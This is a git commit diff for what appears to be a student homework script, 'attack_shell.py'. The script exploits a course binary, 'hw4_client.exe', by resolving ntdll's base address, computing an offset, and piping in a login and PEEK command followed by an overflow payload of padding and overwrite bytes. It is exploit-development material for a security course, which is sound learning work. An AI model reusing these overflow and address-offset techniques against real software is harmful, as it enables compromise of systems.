ea42e346458c7e48e2b80c722289026cf10e5278
orel-david <42713127+orel-david@users.noreply.github.com>
2024-08-22 15:13:07 +0300

    Update attack_shell.py

--- HW4/attack_shell.py
+++ HW4/attack_shell.py
@@ -1,13 +1,28 @@
+import ctypes
 import subprocess
+from ctypes import wintypes  
 
+def GetMoudleHandle(module):     
+    kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)     
+    kernel32.GetModuleHandleW.restype = wintypes.HMODULE     
+    kernel32.GetModuleHandleW.argtypes = [wintypes.LPCWSTR]     
+    hMod = kernel32.GetModuleHandleW(module)     
+    return hMod 
+
+ntdll_base=GetMoudleHandle("ntdll")
+print(hex(ntdll_base))
+offset_from_base = 0x4b31eb7a - ntdll_base
+print(offset_from_base)
 # Path to the .exe file
 exe_path = "hw4_client.exe"
 
 # Start the process
 process = subprocess.Popen(exe_path, stdin=subprocess.PIPE, stdout=subprocess.PIPE, text=True)
-0
-payload= "archer\n56M9JNQ60KB7APLC\nPEEK\n"+("A" * 10000) +"USER\n"
+input()
+
+payload= "archer\n56M9JNQ60KB7APLC\nPEEK\n"+("a" * 0X2098) + "bP (" + "E" * 100
+
 # Provide user_name
 output, error = process.communicate(input= payload)
-print(output)
+# print(output)
 
